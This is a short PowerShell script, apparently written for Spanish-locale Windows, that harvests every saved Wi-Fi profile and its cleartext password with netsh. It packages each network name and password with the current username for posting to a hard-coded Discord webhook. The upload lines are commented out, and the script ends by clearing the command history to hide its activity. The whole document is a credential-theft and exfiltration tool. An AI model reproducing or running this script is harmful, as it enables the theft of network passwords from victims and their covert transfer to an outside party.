$discord = 'https://discord.com/api/webhooks/1447492875704205362/VyqK99hc7pwqsloWyBulkjPktt7zdS6QqDLeaUyovN4pFrWMsBD3fP2ue0ubyBYMNGms'
netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+' 
	Write-Output $wlan+"-->"+$passwd
	$Body = @{
		'username' = $env:username + " | " + [string]$wlan
		'content' = [string]$passw
	}
	
	# Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
	# Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json) > salida.txt
	#Write-Output $Body 

}

Clear-History
